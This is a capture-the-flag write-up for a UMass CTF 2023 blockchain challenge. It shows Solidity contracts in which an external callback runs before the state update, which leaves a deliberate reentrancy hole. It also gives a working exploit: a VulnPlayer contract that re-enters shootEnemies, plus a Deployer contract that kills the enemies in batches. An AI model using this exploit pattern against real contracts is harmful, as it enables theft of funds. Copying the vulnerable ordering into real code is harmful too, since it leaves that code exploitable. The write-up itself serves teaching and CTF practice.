# CsGo but decentralised - blockchain

## Challenge

We receive a netcat connection and a few .sol files. The challenge uses the paradigmCTF infrastructure in which we first have to calculate a pow and then get our blockchain. For the calculation of the PoW, I just used the script provided by Zellic https://github.com/Zellic/example-ctf-challenge/blob/master/solve-pow.py. So let's take a look at the contracts:

The first one is the setup contract. It deploys the challenge contract and is solved if all 20 enemies are dead.

Setup
```
pragma solidity ^0.8.13;

import "./Chal.sol";

contract Setup {
    Chal public immutable TARGET;
    constructor() payable {
        TARGET = new Chal();
    }

    function isSolved() public view returns (bool) {
        for (uint i = 0; i < 20; i++) {
            Enemy enemy = TARGET.enemies(i);
            if (!enemy.isDead()) {
                return false;
            }
        }
        return true;
    }
}

```

The next one is the most important, the challenge. We can see that we have 20 enemies and mappings for guns & bullets. We also have functions for grabbing a gun and shooting enemies.

```
// SPDX-License-Identifier: UNLICENSED

// Challenge author: Shanyu Thibaut JUNEJA (sin), UMass Cyber-Security Club.
// Challenge prepared for UMass CTF 2023
pragma solidity ^0.8.13;

import "./Enemy.sol";
import "./Player.sol";

contract Chal {
    Enemy[20] public enemies;

    uint private players;

    mapping (address => bool) guns;
    mapping (address => uint) bullets;

    constructor() {
        for (uint i = 0; i < 20; i++) {
            enemies[i] = new Enemy();
        }
    }

    function grabGun() public {
        require(guns[msg.sender] == false, "You have already equiped your gun");
        require(players <= 20, "The game can only have 20 players on each team!");

        guns[msg.sender] = true;
        bullets[msg.sender] = 1;
        players += 1;
    }

    function shootEnemies() public {
        require(guns[msg.sender] == true, "You have to pick up a gun");
        require(bullets[msg.sender] > 0, "You have ran out of bullets");

        for (uint i = 0; i < 20; i++) {
            if (enemies[i].isDead())
                continue;
            
            enemies[i].shoot();
            break;
        }

        require (bullets[msg.sender] - 1 < bullets[msg.sender], "Nice integer underflow");
        Player player = Player(msg.sender);
        player.handleRecoil();
        
        bullets[msg.sender] = 0;
    }
}
```

The next contract we have is the Enemy. It seems to need to be shot 20x to be dead.

```
// SPDX-License-Identifier: UNLICENSED
//
// Challenge author: Shanyu Thibaut JUNEJA (sin), UMass Cyber-Security Club.
// Challenge prepared for UMass CTF 2023
pragma solidity ^0.8.13;

import "./openzeppelin/Ownable.sol";

contract Enemy is Ownable {
    uint public health = 20;

    function shoot() public onlyOwner {
        require (health > 0, "Trying to kill a dead entity");
        health = health - 1;
    }

    function isDead() public view returns (bool) {
        return health == 0;
    }
}
```

The last one we get is the player interface. It seems like we need to implement the handleRecoil() function ourselves.

```
// SPDX-License-Identifier: UNLICENSED
//
// Challenge author: Shanyu Thibaut JUNEJA (sin), UMass Cyber-Security Club.
// Challenge prepared for UMass CTF 2023
pragma solidity ^0.8.13;

import "./openzeppelin/Ownable.sol";

interface Player {
    function handleRecoil() external;
}
```

## Solution

The challenge shows a very basic reentrancy vulnerability. We can exploit the handleRecoil() function which is called before decreasing the number of bullets we have to not only be able to shoot once per player but as often as we want. 

I first implemented a VulnPlayer contract which abuses the Reentrancy attack to be able to kill one enemy (could also be more)

```
// SPDX-License-Identifier: UNLICENSED
//
// Challenge author: Shanyu Thibaut JUNEJA (sin), UMass Cyber-Security Club.
// Challenge prepared for UMass CTF 2023
pragma solidity ^0.8.13;

import "./openzeppelin/Ownable.sol";
import "./Chal.sol";
import "./Enemy.sol";

contract VulnPlayer {
    uint256 index;
    Chal challenge;

    constructor(address target, uint256 index_)
    {
        challenge = Chal(target);
        index = index_;
    }

    function attack() public
    {
        challenge.grabGun();
        require(!(challenge.enemies(index).isDead()));
        challenge.shootEnemies();
        require(challenge.enemies(index).isDead());
    }

    function handleRecoil() external
    {
        if (!(challenge.enemies(index).isDead()))
        {
            challenge.shootEnemies();
        }
    }
}
```

I first tried just creating one vuln player and make him kill all the enemies but i was getting into issues with gas usage, so i jsut resorted to creating one player per enemy. I used a deployer contract that when you call the function kill5Enemies() kills 5 enemies at a time (also helpful for debugging and checking if it worked, before burning a lot of gas). Then i just deployed this Deployer contract and called the kill5Enemies() function 4x, which made the isSolved in the setup contract switch to true.

```
// SPDX-License-Identifier: UNLICENSED
//
// Challenge author: Shanyu Thibaut JUNEJA (sin), UMass Cyber-Security Club.
// Challenge prepared for UMass CTF 2023
pragma solidity ^0.8.13;

import "./VulnPlayer.sol";

contract Deployer {
    uint256 public index;
    address target;

    constructor(address target_)
    {
        target = target_;
        index = 0;
    }

    function kill5Enemies() public
    {
        for(uint256 i = 0; i < 5; i++)
        {
            VulnPlayer player = new VulnPlayer(target, index);
            player.attack();
            index += 1;
        }
    }
}
```

